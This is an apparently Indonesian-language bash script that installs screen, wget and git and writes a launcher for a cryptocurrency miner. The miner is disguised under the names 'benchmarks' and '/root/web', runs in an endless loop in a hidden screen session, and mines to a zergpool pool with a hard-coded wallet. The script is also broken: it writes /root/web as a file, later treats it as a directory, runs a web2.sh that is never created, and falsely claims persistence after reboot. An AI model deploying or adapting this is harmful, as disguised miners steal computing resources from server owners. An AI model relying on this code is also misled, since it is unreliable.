#!/bin/bash
echo "📦 Menginstal dependensi..."
apt-get update && apt-get install -y screen wget git

echo "📁 Menyimpan skrip mining ke /root/web..."
cat << 'EOF' > /root/web
#!/bin/bash

cd /root/web || exit

chmod +x web2.sh
chmod +x benchmarks

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yui
      sleep 2
    done
  '
fi
EOF

chmod +x /root/web/web2.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/web/web2.sh

echo "✅ Siap! Mining aktif sekarang & akan otomatis jalan setelah reboot."
